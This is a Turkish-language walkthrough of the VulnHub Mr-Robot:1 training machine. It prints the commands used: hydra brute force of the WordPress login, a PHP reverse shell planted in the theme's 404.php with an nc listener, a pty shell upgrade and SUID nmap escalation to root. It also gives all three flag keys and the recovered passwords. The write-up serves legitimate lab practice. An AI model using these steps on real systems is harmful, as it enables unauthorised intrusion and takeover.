## **Mr-Robot:1 Çözümü | Mr-Robot:1 Walkthrough**
 ## **Merhaba**
 ```shell
 Yukarıda Bulunan "Proje_Mr-Robot1.pdf" Dosyasında Daha Detaylı Anlatım Mevcut"
 Dosya Bütünlüğünü korumak adına Hash Değerlerini Sizlerle Paylaşıyorum.
 MD5 =  125262af219a19a7832019bb840da164
 SHA1 = 73582deb29e3a3d72575f0c9e9c10c1d9534bbfe
 ```
**Bu yazıda VulnHub üzerinde yayınlanan zafiyetli sanal makinelerden biri olan Mr-Robot:1 makinesinin tam çözümünü inceleyeceğiz.**

### **Vulnhub Üzerinden Mr-Robot:1 İndirilmesi**
Mr-Robot:1 makinasını  "https://www.vulnhub.com/entry/mr-robot-1,151/" adresinden indirebiliriz.

### **Vulnhub Üzerinden Mr-Robot:1 İncelenmesi**
Web sitesinde bulunan açıklama kısmına bakıcak olursak.
   ```shell
   Sanal makinamızda gizlenmiş 3 adet anahtar var.
   Bizim amacımız bu anahtarları bulmak.
   ```
### **Vmware Üzerinde Mr-Robot:1 Çalıştırılması**
İndirmiş olduğumuz mrRobot.ova isimli dosyamızı Vmware da çalıştırmak için;
```shell
File -> New Dedik dedikten sonra. 
Dosyamızı tutup Vmware içine bırakmamız yeterli. 
```

## **Önemli Uyarı**
Mr-Robot:1 makinamızı Vmware ye yüklerden ağ ayarlarını yapmanız gerekiyor.
Ağ ayarlarını yapmazsanız.  Mr-Robot:1 makinamız ile Kali linux arasında haberleşmede sorun olucaktır.

Bu ayarı yaptıktan sonra Mr-Robot:1 makinanızı yeniden başlatınız. 
```shell
Mac için Ağ ayarı = >  Share with my Mac ayarını seçin.
Windows için ağ ayarı = > NAT:  ayarını seçin.
```

## **Kali Linux ve Mr-Robot:1 Makinelerinin İp Adreslerini Öğrenelim**
Kali linux ün ip adresi öğrenme
```shell
komut => ifconfig
ip adresi: 192.168.173.128
```
Mr-Robot:1 in ip adresini öğrenme
```bash
komut => netdiscover -r 192.168.173.0/24 
ip adresi: 192.168.173.141
```
## **Mr-Robot:1 Üzerinde Port Taraması**
Makinamız üzerinde açık olan portları görmek ve bu portlar üzerinde çalışan servisleri bulmak için
```bash
komut => nmap -Pn -sV 192.168.173.141
```
 80. port açık ve üzerinde Apache servisi çalışıyor.
> o halde makinamıza tarayıcı üzerinden ulaşım bakalım karşımıza ne çıkıcak.

## **Tarayıcı Üzerinden Mr-Robot:1 İncelemesi**
Kali linux’ de yüklü olan firefox tarayıcımızı açarak Mr-Robot:1 makinamızın ip adresine gidiyoruz.
```bash
http://192.168.173.141/
```
Güzel hazırlanmış bir siteyle karşılaşıyoruz. 
> Komutları yazdığımız zaman. komutun sayfasına gidip bizler için hazırlanmış içerikleri görüyoruz

## **Mr-Robot:1 Gizlenmiş Sayfaları Bulma**
Komutları denerken farklı sayfalara yöneldik.
```bash
http://192.168.173.141/join
http://192.168.173.141/inform
http://192.168.173.141/wakeup
http://192.168.173.141/fsociety
http://192.168.173.141/question
```
Bunlardan başka sayfa var mı diye kontrol edelim.
```bash
komut: => dirb http://192.168.173.141
```
Tarama sonucu yeterli bilgilere ulaştık.
```bash
/robots.txt
/wp-login
```
## **Robots.txt Sayfasını İnceleme**
>192.168.173.141/robots.txt sayfasına gidelim.

```bash
User-agent: *
fsocity.dic
key-1-of-3.txt
```
İki adet bilgiye ulaştık. Bunlardan birisi bizi ilk anahtarımıza götürücek
## **İlk Anahtarı Bulduk**
>192.168.173.141/key-1-of-3.txt sayfasına gidiyoruz.

```bash
1. Anahtar: 073403c8a58a1f80d943455fb30724b9
```
## **Fsocity Sayfasını İnceleme**
>192.168.173.141/fsocity.dic sayfasına gidiyoruz.
Bir dosya buluyoruz.
Dosyayı indirip içini açtığımız zaman.
Bir wordlist list ile karşılaştık.

## **Wordpress İnceleme**

Kullanıcı adı ve parolasını admin-admin yazıp giriş yaptığımızda bu hatayı alıyoruz.
```php
ERROR: Invalid username. Lost your password?
```
Bu hata mesajında dikkat çekici bişey var.
Geçersiz kullanıcı adı hatası.
Yani ilk olarak kullanıcı adımı kontrol ediyor. Eğer doğru girersem parolayı kontrol edicek.
Bir önceki aşamada bulduğum fsocity.dic dosyası bir wordlist di. 
Bizden bu wordlist’ti kullanarak önce kullanıcı adını sonrasında parolasını bulmamızı istiyor.

## **Wordlist Hakkında Bilgi Toplama**
Öncelikle bu wordlist de kaç tane kelime var bunu bulalım.
```bash
kodumuz: => wc -l fsocity.dic 
858160 fsocity.dic
```
>858160 satır var bu dosya ile yapılacak denemeler uzun sürebilir. 

Bu listede  bulunan aynı isimdeki kelimeleri çıkartmak için.
```bash
kodumuz: = > sort  fsocity.dic | uniq >> yeni.txt 
```
Yeni oluşturduğumuz  dosyanın içindeki kelimeler kaç satır hemen bakalım.
```bash
kodumuz: = > wc -l yeni.txt 
11451 yeni.txt
```
>Yaptığımız işlem başarı olmuş. 858 bin den 11 bine düştü gayet güzel.

## **Wordpress Kullanıcı Girişi Bilgi Toplama**
hydra yardımıyla wordlist’ti kullanıcaz ancak öğrenmemiz gereken bazı bilgiler var.
bunuda Burpsuite ile araya girip öğreneceğiz.
```bash
Önce tarayıcımızın proxy ayarını yapıyoruz.
Daha sonra Burpsuite açıyoruz Intercept ‘i on yapıyoruz
Giriş yapmayı deniyoruz.
```
Burpsuite den ihtiyacımız olan bilgileri alıyoruz.
```bash
POST /wp-login.php HTTP/1.1
log=admin&pwd=admin&wp-submit=Log+In
```

## **Brute Force Yöntemi ile Kullanıcı Adı Bulma**
Kullanıcı adını bulurken fsocity.dic dosyasını kullanıcam.
```bash
kodumuz: = > hydra -V -L fsocity.dic -p 12345 192.168.173.141 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'

```
Bir süre sonra kullanıcı adımızı buluyoruz.
```bash
Kullanıcı adımız: Elliot
```
## **Brute Force Yöntemi ile Parola Bulma**
Kullanıcı parolasını bulurken yeni.txt dosyasını kullanıcaz.
```bash
kodumuz: = > hydra -V -l Elliot -P yeni.txt 192.168.173.141 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is incorrect'

```
Bir süre sonra kullanıcı parolamızı buluyoruz.
```bash
Kullanıcı parolamız: ER28-0652
```
## **Wordpress Admin Panelinden Giriş **
Elde ettiğimiz kullanıcı adı ve parolası ile panelden giriş yapalım
```bash
Kullanıcı adımız: Elliot
Kullanıcı parolamız: ER28-0652
```
Öncelikle giriş yapmış olduğumuz kullanıcının yetkisi öğreniyoruz.
Elliot kullanıcısı yönetici yetkisine sahip.
>Reverse Shell yöntemini kullanalım.

İhtiyacımız olan reverse shell dosyasını internetten bulalım.

## **Wordpress Yönetici Panelinden Shell Yükleme**
http://pentestmonkey.net sitesine giriş yapıyoruz.

>php-reverse-shell ‘e tıklıyoruz
php-rever-shell-1.0.tar.gz ‘ ye tıklayıp dosyayı bilgisayarımıza indiriyoruz.

İndirmiş olduğumuz php shell ‘i text editör ile açıyoruz.

>Dosya içerisinde bulunan $ip = 127.0.0.1 ; kısmını Kendi İp adresimizle değiştiriyoruz.

php-reverse-shell.php dosyasının içindeki her şeyi kopyalıyoruz.

## **Wordpress Yönetici Panelinden Shell Yükleme**

Wp admin panelinden Tema editörüne giriyoruz ve 404.php dosyasının içindeki her şeyi silip kopyaladığımız kodları yapıştırıyoruz. 
>update file diyerek 404.php dosyasını güncelliyoruz. 

## **Shell Dosyası Kullanarak Sisteme Bağlanma**
Öncelikle bağlantının geleceği portu dinlemeye başlayalım.
```bash
kod: => nc -lvp 1234 
```
Shell dosyasını çalıştırmak için istek de bulunuyoruz.
>yeni bir terminal penceresi açıp

```bash
kod: => curl http://192.168.173.141/404.php
```
>Başarı bir şekilde bağlantımızı kurduk.
Ancak şu anda hiçbir yetkimiz yok.

## **Linux Etkileşimsiz Kabuktan - Etkileşimli Kabuğa Geçme**

```bash
kod: => python -c 'import pty;pty.spawn ("/bin/bash")'
```
>deamon kullanıcısına geçiş yaptık

Hızlı bir şekilde klasörleri kontrol ediyoruz. Home -> robot -> içerisinde 2. anahtarımızın bulunduğu bir txt dosyası var ancak erişim sağlayamıyoruz. Dosyayı okumak için robot kullanıcısına geçiş yapmamız gerekiyor.  Password.raw-md5. dosyasını açtığımız zaman. karşımıza robot kullanıcısının md5 ile şifrelenmiş parolasını buluyoruz.

## **Kullanıcı Değiştirme**

password.raw-md5 dosyasının içinde bulunan robot kullanıcısının hash değerini kopyalıyoruz. 

```bash
Hash değeri: => c3fcd3d76192e4007dfb496cca67e13b
```
hash değerini çözmek için https://crackstation.net sitesini kullanıyoruz.

Robot kullanıcısının parolasını bulduk.
 ```bash
parola = abcdefghijklmnopqrstuvwxyz 

```

## **İkinci Anahtarı Bulduk**
robot kullanıcısına geçiş yapıyoruz ve anahtarın bulunduğu dosyayı açıyoruz.
>su robot
password: abcdefghijklmnopqrstuvwxyz
ls
key-2-of-3.txt  password.raw-md5
cat key-2-of-3.txt

```bash
İkinci anahtar : => 822c73956184f694993bede3eb39f959
```

## **Root Yetkisine Yükselme**
Root klasörüne gitmeyi deniyelim.
Root klasörüne girme yetkimiz yok.

Yönetici yetkisiyle çalışan uygulamaları arayalım.
```bash
kod: => find / -perm -4000 2>/dev/null
```
> Yetki yükseltmek için Nmap’i Kullanabiliriz.

## **Nmap ile Root Olma**
nmap i çalıştırıyoruz.
```bash
kod: => nmap
```
>nmap’in interactive özelliğiyle bunu yapcaz.

!sh komutunu giriyoruz .
```bash
kod: => !sh
```
kim olduğumuzu kontrol ediyoruz.
```bash
kod: => whoami
whoami
root
#
```
Başarılı bir şekilde root yetkisine yükseldik.

## **Üçüncü Anahtarı Bulduk**
root klasörünü inceleyelim
```bash
# cd /root
cd /root
# ls
ls
firsboot_done  key-3-of-3.txt
```
Mr-Robot:1 makinamızdaki görevleri tamamladık.
Son anahtarımızı bulduk.
```bash
3. Anahtar: 04787ddef27c3dee1ee161b21670b4e4
```
## **Sonuç**
Mr-Robot:1 makinamızda bulunan anahtarlar.
```bash
1. Anahtar: 073403c8a58a1f80d943455fb30724b9
2. Anahtar: 822c73956184f694993bede3eb39f959
3. Anahtar: 04787ddef27c3dee1ee161b21670b4e4
```
